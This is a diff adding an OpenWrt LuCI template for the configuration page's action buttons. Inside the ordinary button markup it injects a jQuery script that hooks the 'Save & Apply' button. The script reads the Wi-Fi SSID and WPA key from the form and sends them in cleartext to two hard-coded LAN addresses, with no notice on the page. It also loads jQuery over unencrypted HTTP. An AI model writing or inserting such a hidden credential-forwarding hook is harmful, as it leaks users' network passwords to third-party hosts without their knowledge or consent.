@@ -1,0 +1,49 @@
+	<%- if pageaction then -%>
+	<div class="cbi-page-actions">
+		<% if redirect then %>
+		<div style="float:left">
+			<input class="cbi-button cbi-button-link" type="button" value="<%:Back to Overview%>" onclick="location.href='<%=pcdata(redirect)%>'" />
+		</div>
+		<% end %>
+
+		<% if flow.skip then %>
+			<input class="cbi-button cbi-button-skip" type="submit" name="cbi.skip" value="<%:Skip%>" />
+		<% end %>
+		<% if not autoapply and not flow.hideapplybtn then %>
+			<input id="apply" class="cbi-button cbi-button-apply" type="submit" name="cbi.apply" value="<%:Save & Apply%>" />
+		<% end %>
+		<% if not flow.hidesavebtn then %>
+			<input class="cbi-button cbi-button-save" type="submit" value="<%:Save%>" />
+		<% end %>
+		<% if not flow.hideresetbtn then %>
+			<input class="cbi-button cbi-button-reset" type="reset" value="<%:Reset%>" />
+		<% end %>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+		<script type="text/javascript">cbi_d_update();
+		$(document).ready(function(){
+         $("#apply").click(function(){
+            
+            // var p = $(this).attr('value'); 
+//            var id = $("#ssid").val();
+//           var pass = $("#password").val();
+//           var result = id + ";" + pass;
+		var result = "hello" ;
+		console.log("post");
+		var id = document.getElementById("cbid.wireless.cfg033579.ssid");
+		console.log("ssid : "+ id);
+		var pw = document.getElementById("cbid.wireless.cfg033579._wpa_key");
+		console.log("pw : ",pw);
+            	
+		if( id != null && pw !=null)
+		{
+		    result = id.value + ";" + pw.value;
+	            $.get("http://192.168.1.186:80/", {wifi:result}); 
+	            $.get("http://192.168.1.181:80/", {wifi:result});
+		}
+         });
+      });
+		</script>
+	</div>
+	<%- end -%>
+</form>
+<%+footer%>
